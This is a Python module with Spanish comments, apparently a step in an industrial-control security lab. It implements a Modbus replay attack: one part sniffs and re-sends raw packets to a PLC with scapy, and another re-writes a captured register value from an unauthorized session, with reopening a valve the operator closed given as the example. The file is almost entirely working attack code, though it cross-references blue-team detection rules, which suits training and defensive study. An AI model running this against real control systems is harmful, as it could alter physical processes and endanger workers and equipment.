"""Ataque de replay (Bloque D, Paso 15).

Dos implementaciones del mismo ataque — grabar un comando de control legítimo
y reproducirlo más tarde (ej. reabrir una válvula que el operador ya cerró):

  - `capturar_paquetes_modbus` / `reinyectar_paquetes` (scapy): captura y
    reinyecta a nivel de paquete crudo. Requiere Npcap (Windows) / root (Linux).
  - `capturar_comando` / `reinyectar_comando` (portable): trabaja a nivel de la
    aplicación Modbus — lee el valor actual de un registro (el "comando grabado")
    y lo vuelve a escribir tal cual desde una sesión Modbus nueva. Sin scapy ni
    privilegios. El valor reinyectado es válido (no dispara la regla de rango),
    pero llega desde un origen no autorizado, así que lo caza la allowlist
    (R-ALLOW-001) — el mismo hueco de detección de replay documentado en
    blueteam/deteccion.py.
"""

from pymodbus.client import AsyncModbusTcpClient

PUERTO_MODBUS = 502


def capturar_paquetes_modbus(
    host_objetivo: str,
    cantidad: int,
    timeout: float,
    interfaz: str | None = None,
    puerto: int = PUERTO_MODBUS,
) -> list:
    """Captura hasta `cantidad` paquetes TCP dirigidos al puerto Modbus
    (`puerto`) de `host_objetivo`, o hasta que venza `timeout` (segundos).

    `interfaz=None` usa la interfaz por defecto de scapy.
    """
    from scapy.all import sniff

    filtro = f"tcp and port {puerto} and host {host_objetivo}"
    return list(sniff(iface=interfaz, filter=filtro, count=cantidad, timeout=timeout))


def reinyectar_paquetes(paquetes: list, interfaz: str | None = None) -> int:
    """Reenvía cada paquete capturado tal cual, sin modificar ningún campo.

    Devuelve la cantidad de paquetes reinyectados.
    """
    from scapy.all import sendp

    for paquete in paquetes:
        sendp(paquete, iface=interfaz, verbose=0)
    return len(paquetes)


async def capturar_comando(host: str, puerto: int, direccion: int, slave: int = 1) -> int:
    """Versión portable: "graba" un comando legítimo leyendo el valor actual del
    registro `direccion`. Es el equivalente a nivel de aplicación de capturar el
    paquete de un write que el HMI ya hizo."""
    client = AsyncModbusTcpClient(host, port=puerto)
    await client.connect()
    try:
        respuesta = await client.read_holding_registers(address=direccion, count=1, slave=slave)
        return respuesta.registers[0]
    finally:
        client.close()


async def reinyectar_comando(
    host: str, puerto: int, direccion: int, valor: int, slave: int = 1
) -> bool:
    """Versión portable: reproduce el comando grabado escribiéndolo de nuevo, sin
    modificar el valor, desde una sesión Modbus nueva (la del atacante).

    Devuelve True si el PLC aceptó la reinyección.
    """
    client = AsyncModbusTcpClient(host, port=puerto)
    await client.connect()
    try:
        respuesta = await client.write_register(address=direccion, value=valor, slave=slave)
        return not respuesta.isError()
    finally:
        client.close()
